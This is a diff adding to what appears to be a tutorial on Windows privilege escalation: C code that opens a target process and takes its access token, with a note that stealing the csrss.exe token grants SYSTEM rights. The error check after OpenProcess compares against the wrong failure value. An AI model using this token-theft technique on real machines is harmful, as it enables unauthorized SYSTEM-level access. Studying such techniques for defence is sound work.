@@ -407,5 +407,42 @@ HANDLE GetSystemToken()
 
 --> `Enables SeDebugPrivilege → opens token of csrss.exe → gains SYSTEM privileges. csrss.exe is targeted because it runs as SYSTEM and is a trusted critical process.`
 
+```php
+HANDLE OpenProcessTokenByName(_In_ LPCWSTR ProcessName)
+{
+    ULONG  ProcessId;
+    HANDLE ProcessHandle;
+    HANDLE TokenHandle = 0;
 
+    ProcessId = GetProcessPid(ProcessName);
+
+    if (ProcessId == 0)
+    {
+        wprintf(L"Could not get the PID of: %ws\n", ProcessName);
+        return 0;
+    }
+
+
+
+
+    ProcessHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, ProcessId);
+
+    if (ProcessHandle == INVALID_HANDLE_VALUE)
+    {
+        wprintf(L"Could not open a handle to: %lu error: %lu\n", ProcessId, GetLastError());
+        return 0;
+    }
+
+
+
+    if (OpenProcessToken(ProcessHandle, TOKEN_QUERY | TOKEN_DUPLICATE, &TokenHandle) == FALSE)
+    {
+        wprintf(L"Could not open a handle to the token of: %lu error: %lu\n", ProcessId, GetLastError());
+    }
+
+    CloseHandle(ProcessHandle);
+    return TokenHandle;
+}
+```
+--> `This function retrieves the access token of a target process (csrss.exe) by resolving its PID, opening the process, and calling OpenProcessToken with duplicate rights. The returned token can later be used for impersonation or spawning processes under the target’s security context (SYSTEM).`
 
